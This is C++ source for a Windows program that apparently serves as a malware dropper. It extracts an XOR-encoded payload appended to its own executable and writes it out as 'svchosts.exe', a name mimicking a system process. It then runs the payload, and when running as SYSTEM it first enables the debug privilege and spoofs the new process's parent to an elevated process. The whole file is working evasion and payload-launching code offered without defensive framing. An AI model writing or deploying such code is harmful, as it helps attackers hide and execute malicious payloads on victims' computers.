#include "stdafx.h"
#include <windows.h>
#include <TlHelp32.h>
#include <Shlobj.h>

bool IsSystemPrivilegeCmp()
{
	char* flag = "C:\\Windows";
	char szPath[MAX_PATH] = { 0 };
	if (SHGetSpecialFolderPathA(NULL, szPath, CSIDL_APPDATA, TRUE))
	{
		if (memcmp(szPath, flag, strlen(flag)) == 0)
			return TRUE;
		else
			return FALSE;
	}
	return FALSE;
}

void DisplayErrorMessage(LPTSTR pszMessage, DWORD dwLastError)
{
	HLOCAL hlErrorMessage = NULL;
	if (FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_ALLOCATE_BUFFER, NULL, dwLastError, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PTSTR) &hlErrorMessage, 0, NULL))
	{
		_tprintf(TEXT("%s: %s"), pszMessage, (PCTSTR) LocalLock(hlErrorMessage));
		LocalFree(hlErrorMessage);
	}
}

BOOL IsRunasAdmin(HANDLE hProcess)
{
	BOOL bElevated = FALSE;
	HANDLE hToken = NULL;
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
		return FALSE;
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen))
	{
		if (dwRetLen == sizeof(tokenEle))
		{
			bElevated = tokenEle.TokenIsElevated;
		}
	}
	CloseHandle(hToken);
	return bElevated;
}

BOOL CurrentProcessAdjustToken(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES sTP;

	if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}

DWORD SelectParent(DWORD ParentPid) 
{
	STARTUPINFOEX sie = { sizeof(sie) };
	ZeroMemory(&sie, sizeof(sie));
	sie.StartupInfo.cb = sizeof(sie);
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = ParentPid;

	if (0 == dwPid)
	{
		_putts(TEXT("can't find ctfmon.exe"));
		return 0;
	}
	printf("find pid : %d\r\n", dwPid);

	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	if (NULL == pAttributeList)
	{
		DisplayErrorMessage(TEXT("HeapAlloc error"), GetLastError());
		return 0;
	}
	if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
	{
		DisplayErrorMessage(TEXT("InitializeProcThreadAttributeList error"), GetLastError());
		return 0;
	}
	if (!CurrentProcessAdjustToken())
	{
		DisplayErrorMessage(TEXT("CurrentProcessAdjustToken error"), GetLastError());
		return 0;
	}
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (NULL == hParentProcess)
	{
		DisplayErrorMessage(TEXT("OpenProcess error"), GetLastError());
		return 0;
	}
	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
	{
		DisplayErrorMessage(TEXT("UpdateProcThreadAttribute error"), GetLastError());
		return 0;
	}
	sie.lpAttributeList = pAttributeList;
	WCHAR releaseFile[MAX_PATH];
	ZeroMemory(releaseFile, MAX_PATH);
	GetCurrentDirectory(MAX_PATH, releaseFile);
	releaseFile[lstrlenW(releaseFile)] = '\\';
	memcpy(releaseFile + lstrlenW(releaseFile), L"svchosts.exe", lstrlenW(L"svchosts.exe") * 2);
	if (!CreateProcess(releaseFile, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
	{
		DisplayErrorMessage(TEXT("CreateProcess error"), GetLastError());
		return 0;
	}
	_tprintf(TEXT("Process created: %d\n"), pi.dwProcessId);
	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(hParentProcess);
	return pi.dwProcessId;
}

BOOL CheckProcessauthority()
{
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	BOOL bRunAsAdmin;

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		wprintf(L"[!]CreateToolhelp32Snapshot Failed.<%d>\n", GetLastError());
		return(FALSE);
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		wprintf(L"[!]Process32First Failed.<%d>\n", GetLastError());
		CloseHandle(hProcessSnap);
		return(FALSE);
	}
	do
	{
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
		bRunAsAdmin = IsRunasAdmin(hProcess);
		if (bRunAsAdmin) {
			DWORD tmpPid = SelectParent(pe32.th32ProcessID);
			HANDLE testOpen = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tmpPid);
			if (testOpen)return TRUE;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return(TRUE);
}




int _tmain(int argc, _TCHAR* argv[])
{	
	WCHAR selfPath[MAX_PATH];
	ZeroMemory(selfPath, MAX_PATH);
	GetCurrentDirectory(MAX_PATH, selfPath);
	selfPath[lstrlenW(selfPath)] = '\\';
	memcpy(selfPath + lstrlenW(selfPath), argv[0], lstrlenW(argv[0])*2);
	
	HANDLE hSelfPath = CreateFile(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hSelfPath == INVALID_HANDLE_VALUE)
	{
		wprintf(L"CreateFile selfPath Error : %d\r\n", GetLastError());
		return 0;
	}

	DWORD totalSize = GetFileSize(hSelfPath,NULL);
	PBYTE selfBuff = (PBYTE)malloc(totalSize);
	DWORD sizeRead = 0;
	if (!ReadFile(hSelfPath, selfBuff, totalSize, &sizeRead, NULL)) 
	{
		wprintf(L"ReadFile selfPath Error : %d\r\n", GetLastError());
		return 0;
	}

	DWORD fileOffset = *(DWORD*)(selfBuff + totalSize - 4);

	WCHAR releaseFile[MAX_PATH];
	ZeroMemory(releaseFile, MAX_PATH);
	GetCurrentDirectory(MAX_PATH, releaseFile);
	releaseFile[lstrlenW(releaseFile)] = '\\';
	memcpy(releaseFile + lstrlenW(releaseFile), L"svchosts.exe", lstrlenW(L"svchosts.exe") * 2);

	HANDLE hReleaseFile = CreateFile(releaseFile, GENERIC_ALL, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hReleaseFile == INVALID_HANDLE_VALUE)
	{
		wprintf(L"CreateFile ReleaseFile Error : %d\r\n", GetLastError());
		return 0;
	}

	for (size_t i = fileOffset; i < totalSize - 4; i++)
	{
		selfBuff[i] ^= 0xCC;
	}

	DWORD WrittenNum;
	if(!WriteFile(hReleaseFile,selfBuff+fileOffset,totalSize - fileOffset-4, &WrittenNum, NULL))
	{
		wprintf(L"WriteFile ReleaseFile Error : %d\r\n", GetLastError());
		return 0;
	}
	CloseHandle(hReleaseFile);
	CloseHandle(hSelfPath);
	if (IsSystemPrivilegeCmp()) 
	{
		CheckProcessauthority();
	}
	else
	{
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = TRUE;
		BOOL bRet = CreateProcess(releaseFile, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		if (!bRet)
		{
			wprintf(L"CreateProcess ReleaseFile Error : %d\r\n", GetLastError());
			return 0;
		}
	}
	return 0;
}
